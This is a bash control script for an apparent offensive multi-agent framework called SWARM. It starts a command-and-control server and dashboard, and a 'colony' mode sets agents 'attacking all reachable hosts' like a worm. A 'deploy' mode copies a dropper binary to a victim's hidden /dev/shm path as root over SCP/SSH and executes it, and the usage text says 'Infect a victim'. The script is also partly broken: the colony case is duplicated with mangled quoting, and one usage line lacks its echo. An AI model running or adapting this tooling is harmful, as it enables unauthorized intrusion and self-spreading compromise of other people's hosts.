#!/bin/bash
# SWARM Control — multi-agent framework.
# ./hive.sh brain    → C2 + dashboard (safe, solo operador)
# ./hive.sh colony   → C2 + dashboard + agentes agresivos
# ./hive.sh deploy   → desplegar stinger en víctima vía SSH
# ./hive.sh stop     → matar todo
# ./hive.sh status   → ver agentes vivos

set -euo pipefail
export OPENSSL_DIR="${OPENSSL_DIR:-/usr}"
export OPENSSL_LIB_DIR="${OPENSSL_LIB_DIR:-/usr/lib/x86_64-linux-gnu}"
export OPENSSL_INCLUDE_DIR="${OPENSSL_INCLUDE_DIR:-/usr/include}"

GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'
BOLD='\033[1m'

cd "$(dirname "$0")"

_cleanup() {
    pkill -f "dashboard.py" 2>/dev/null || true
    pkill -f "c2_server.py" 2>/dev/null || true
    pkill -f "target/debug/worker" 2>/dev/null || true
    pkill -f "target/debug/drone" 2>/dev/null || true
    pkill -f "target/debug/honeybee" 2>/dev/null || true
    pkill -f "target/debug/weaver" 2>/dev/null || true
    pkill -f "target/debug/queen" 2>/dev/null || true
    pkill -f "target/debug/swarm" 2>/dev/null || true
    pkill -f "buzz" 2>/dev/null || true
    sleep 1
}

_build() {
    echo -e "${GREEN}[build] Compiling...${NC}"
    cargo build --workspace 2>&1 | tail -1
}

_launch_c2() {
    echo -e "${GREEN}[c2] C2 Server :8443${NC}"
    python3 tests/c2_server.py --port 8443 --no-tls > /dev/null 2>&1 &
    sleep 1
}

_launch_dashboard() {
    echo -e "${GREEN}[dash] Dashboard :8080${NC}"
    python3 tests/dashboard.py --port 8080 > /dev/null 2>&1 &
    sleep 1
}

_banner() {
    local mode="$1"
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║   SWARM ${mode}${NC}"
    echo -e "${CYAN}║   Dashboard: http://localhost:8080           ║${NC}"
    echo -e "${CYAN}║   C2 API:    http://localhost:8443/health    ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    echo "Press Ctrl+C to stop. Or run: ./hive.sh stop"
}

case "${1:-}" in
    brain)
        _cleanup
        _build
        _launch_c2
        _launch_dashboard
        _banner "BRAIN (safe mode)"
        echo -e "${YELLOW}Brain mode: C2 + dashboard only. No agents launched.${NC}"
        echo -e "${YELLOW}Your IP is protected in hive.toml [brain] safe_ips${NC}"
        sleep infinity
        ;;

    passive)
        _cleanup
        _build
        _launch_c2
        _launch_dashboard
        _banner "PASSIVE (recon only)"
        echo -e "${CYAN}Passive mode: Worker + Guardian only. No attacks.${NC}"
        echo -e "${CYAN}Maps network, discovers hosts, generates ATT&CK report.${NC}"
        sed -i "s/aggressive = true/aggressive = false/" hive.toml 2>/dev/null || true
        cargo run -p buzz &
        wait $! 2>/dev/null || true
        ;;

    colony)
        _cleanup
        if ! grep -q "aggressive = true" hive.toml 2>/dev/null; then
            echo -e "${YELLOW}Enabling colony aggressive mode...${NC}"
            sed -i "s/aggressive = false/aggressive = true/" hive.toml 2>/dev/null || true
        fi
        _build
        _launch_c2
        _launch_dashboard
        _banner "COLONY (aggressive)"
        echo -e "${RED}AGENTS + SWARM: attacking all reachable hosts${NC}"
        echo -e "${RED}Safe IPs protected: $(grep -A5 "[brain]" hive.toml | grep safe_ips -A10 | grep """ | tr "
" " " 2>/dev/null)${NC}"
        echo ""
        cargo run -p buzz &
        SWARM_PID=$!
        wait $SWARM_PID 2>/dev/null || true
        ;;

    colony)
        _cleanup
        # Enable aggressive mode in config
        if ! grep -q "aggressive = true" hive.toml 2>/dev/null; then
            echo -e "${YELLOW}Enabling colony aggressive mode...${NC}"
            sed -i 's/aggressive = false/aggressive = true/' hive.toml 2>/dev/null || true
        fi
        _build
        _launch_c2
        _launch_dashboard
        _banner "COLONY (aggressive)"
        echo -e "${RED}AGENTS + WORM: attacking all reachable hosts${NC}"
        echo -e "${RED}Safe IPs protected: $(grep -A5 '\[brain\]' hive.toml | grep safe_ips -A10 | grep '"' | tr '\n' ' ')${NC}"
        echo ""
        cargo run -p buzz &
        SWARM_PID=$!
        wait $SWARM_PID 2>/dev/null || true
        ;;

    deploy)
        target="${2:-}"
        if [[ -z "$target" ]]; then
            echo "Usage: ./hive.sh deploy <victim-ip>"
            echo "  ./hive.sh deploy 192.168.1.50"
            exit 1
        fi
        _build
        echo -e "${GREEN}Deploying stinger to $target...${NC}"
        # Compile stinger and SCP to target, then SSH exec
        cargo build -p stinger 2>&1 | tail -1
        if [[ -f "target/debug/stinger" ]]; then
            scp target/debug/stinger "root@$target:/dev/shm/.d" 2>/dev/null && \
            ssh "root@$target" "chmod +x /dev/shm/.d && /dev/shm/.d" 2>/dev/null && \
            echo -e "${GREEN}Deployed to $target. Swarm will activate.${NC}" || \
            echo -e "${RED}Deploy failed. Check SSH access to $target${NC}"
        else
            echo -e "${RED}Dropper binary not found. Build failed.${NC}"
        fi
        ;;

    stop)
        _cleanup
        echo -e "${GREEN}All swarm processes stopped.${NC}"
        ;;

    status)
        echo -e "${BOLD}=== SWARM STATUS ===${NC}"
        echo ""
        printf "%-10s %-8s %s\n" "ROLE" "PID" "MEMORY"
        printf "%-10s %-8s %s\n" "----------" "--------" "------"
        for role in worker drone honeybee weaver queen swarm; do
            pids=$(pgrep -f "target/debug/$role" 2>/dev/null || true)
            if [[ -n "$pids" ]]; then
                for pid in $pids; do
                    mem=$(awk '/VmRSS/{printf "%dM", $2/1024}' /proc/$pid/status 2>/dev/null || echo "?")
                    printf "${GREEN}%-10s${NC} %-8s %s\n" "$role" "$pid" "$mem"
                done
            else
                printf "${RED}%-10s${NC} %-8s %s\n" "$role" "-" "offline"
            fi
        done
        echo ""
        echo "Dashboard: $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080 2>/dev/null || echo 'down')"
        echo "C2:        $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8443/health 2>/dev/null || echo 'down')"
        ;;

    dashboard)
        python3 tests/dashboard.py --port 8080
        ;;

    test)
        cargo test --workspace 2>&1 | grep -E "test result|FAILED"
        ;;

    build)
        cargo build --workspace
        ;;

    *)
        echo -e "${CYAN}SWARM Control${NC}"
        echo ""
        echo "Usage: ./hive.sh <command>"
        echo ""
        echo -e "${BOLD}Operating modes:${NC}"
        echo "  brain     C2 + dashboard only (safe, no agents)"
  passive   C2 + dashboard + recon only (no attacks)
        echo "  colony    C2 + dashboard + AGGRESSIVE agents + swarm"
        echo "  deploy    Deploy stinger to remote victim via SCP/SSH"
        echo ""
        echo -e "${BOLD}Utilities:${NC}"
        echo "  stop      Kill all swarm processes"
        echo "  status    Show running agents"
        echo "  dashboard Launch dashboard only"
        echo "  test      Run all 28 tests"
        echo "  build     Build workspace"
        echo ""
        echo -e "${BOLD}Examples:${NC}"
        echo "  ./hive.sh brain                # Safe: just monitor"
        echo "  ./hive.sh colony               # Aggressive: attack all hosts"
        echo "  ./hive.sh deploy 192.168.1.50  # Infect a victim"
        echo "  ./hive.sh status               # See what's running"
        ;;
esac
